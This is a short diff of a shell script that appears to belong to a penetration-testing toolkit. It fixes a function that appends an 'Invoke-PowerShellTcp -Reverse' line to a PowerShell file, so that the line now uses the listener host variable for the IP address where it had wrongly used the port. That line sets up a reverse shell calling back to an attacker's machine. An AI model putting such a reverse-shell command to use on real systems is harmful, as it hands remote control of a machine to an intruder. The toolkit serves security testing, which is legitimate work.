@@ -767,7 +767,7 @@ nb-install-invoke-powershelltcp-append() {
         nb-vars-set-lhost
         nb-vars-set-lport
         __info "Reverse shell successfully appended"
-        echo "Invoke-PowerShellTcp -Reverse -IPAddress ${__LPORT} -Port ${__LPORT}" | tee -a "$pws"
+        echo "Invoke-PowerShellTcp -Reverse -IPAddress ${__LHOST} -Port ${__LPORT}" | tee -a "$pws"
         return
     else
         __warn "Operation cancelled by user."
